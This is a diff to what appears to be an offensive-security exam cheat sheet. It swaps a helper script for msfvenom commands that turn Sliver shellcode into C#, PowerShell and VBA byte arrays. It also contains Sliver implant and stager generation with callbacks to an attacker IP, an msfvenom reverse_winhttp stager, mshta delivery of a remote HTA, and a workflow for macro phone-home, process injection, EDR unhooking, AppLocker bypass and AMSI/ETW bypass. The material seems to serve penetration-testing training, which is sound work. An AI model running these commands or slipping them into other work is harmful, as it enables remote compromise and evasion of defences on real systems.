@@ -83,9 +83,9 @@ Deliver: `mshta.exe http://<IP>/red.hta`
 # Raw PIC shellcode (→ encrypt, or → NimSyscallPacker)
 sliver > generate --mtls <IP>:8888 --format shellcode --save /tmp/sc.bin
 
-# Convert to C# / PowerShell byte arrays for the loaders:
-python3 sliver/sliver2arrays.py /tmp/sc.bin --csharp   # aes-loaders/, cs-loaders/
-python3 sliver/sliver2arrays.py /tmp/sc.bin --ps1      # ps-shellcode-runner.ps1
+# Convert to C# / PowerShell byte arrays for the loaders (msfvenom):
+msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f csharp -o /tmp/sc.cs   # aes-loaders/, cs-loaders/
+msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f ps1 -o /tmp/sc.ps1     # ps-shellcode-runner.ps1
 
 # Standalone EXE (→ NimSyscallPacker, or direct delivery)
 sliver > generate --mtls <IP>:8888 --format exe --save /tmp/implant.exe
@@ -96,21 +96,21 @@ Use a **stager** (few hundred bytes) instead of the full implant (MBs):
 
 ```bash
 sliver > profiles new --mtls <IP>:8888 --format shellcode my-profile
-sliver > stage-listener --url http://<IP>:8080 --profile my-profile
-sliver > profiles stage --save /tmp/stage2.bin my-profile
+sliver > stage-listener --url http://<IP>:8080 --profile my-profile --prepend-size
+msfvenom -p windows/x64/custom/reverse_winhttp LHOST=<IP> LPORT=8080 LURI=/hello.woff -f raw -o /tmp/stager.bin
 ```
 
 Convert raw → array when needed:
 
 ```bash
-python3 sliver/sliver2arrays.py /tmp/sc.bin --csharp   # C#  byte[]
-python3 sliver/sliver2arrays.py /tmp/sc.bin --ps1      # PowerShell
-python3 sliver/sliver2arrays.py /tmp/sc.bin --vba      # VBA  Array(...)
+msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f csharp -o /tmp/sc.cs   # C#  byte[]
+msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f ps1 -o /tmp/sc.ps1     # PowerShell
+msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f vba -o /tmp/sc.vba     # VBA  Array(...)
 ```
 
 > **Rule of thumb:** full Sliver shellcode is MBs — only use it in C# runners that
 > allocate `shellcode.Length` (all loaders in this repo now do). For VBA macros,
-> use `sliver2arrays.py --vba` output or a stager.
+> generate a small msfvenom stager (`-f vba`) instead.
 
 ---
 
@@ -274,7 +274,7 @@ deprecated/unmaintained — test on a lab VM before exam day.
 ## One-line mental model
 
 1. **Recon** → macro phones home → know AppLocker + arch.
-2. **Generate** → `sliver > generate --mtls <IP>:8888 --format <exe|shared|service|shellcode>`; convert shellcode with `sliver2arrays.py`.
+2. **Generate** → `sliver > generate --mtls <IP>:8888 --format <exe|shared|service|shellcode>`; make arrays/stagers with `msfvenom`.
 3. **Obfuscate** → Caesar < XOR < AES as AV pressure rises.
 4. **Execute** → self-inject → remote-inject → hollowing → Nt* → APC → DInvoke → unhook, as EDR pressure rises.
 5. **AppLocker** → InstallUtil / msbuild / regsvr32. **PowerShell** → AMSI/ETW first.
